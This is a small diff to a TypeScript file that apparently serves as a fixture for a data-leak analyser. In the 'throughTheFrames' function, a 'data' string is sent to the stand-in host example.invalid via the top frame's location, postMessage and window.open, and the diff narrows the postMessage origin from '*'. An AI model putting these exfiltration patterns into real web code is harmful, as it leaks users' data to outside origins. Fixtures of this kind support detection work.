@@ -22,7 +22,7 @@ export function throughGlobalThis(data: string): void {
 
 export function throughTheFrames(data: string): void {
   (top as any).location = `https://example.invalid/?${data}`;
-  parent.postMessage(data, "*");
+  parent.postMessage(data, "https://example.invalid");
   const opened = (self as any).open;
   opened(`https://example.invalid/?${data}`);
 }
